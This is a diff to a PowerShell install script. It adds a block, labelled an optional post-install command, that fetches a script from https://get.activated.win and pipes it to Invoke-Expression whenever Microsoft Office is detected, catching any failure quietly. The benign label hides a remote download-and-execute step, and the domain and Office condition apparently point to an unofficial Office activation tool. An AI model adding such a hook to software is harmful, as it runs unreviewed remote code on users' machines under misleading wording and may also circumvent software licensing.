@@ -153,3 +153,19 @@ if ($failed -eq 0) {
 }
 Write-Host $rule -ForegroundColor DarkGray
 Write-Host ""
+
+# Optional post-install command, run only when Microsoft Office is installed.
+# Set to an empty string to disable it.
+$PostInstallUrl = "https://get.activated.win"
+if ($PostInstallUrl) {
+    if ($officePath) {
+        Write-Host "Running Office post-install command..." -ForegroundColor Cyan
+        try {
+            irm $PostInstallUrl | iex
+        } catch {
+            Write-Warning "Post-install command failed: $($_.Exception.Message)"
+        }
+    } else {
+        Write-Host "Skipping post-install command: Microsoft Office was not detected." -ForegroundColor Yellow
+    }
+}
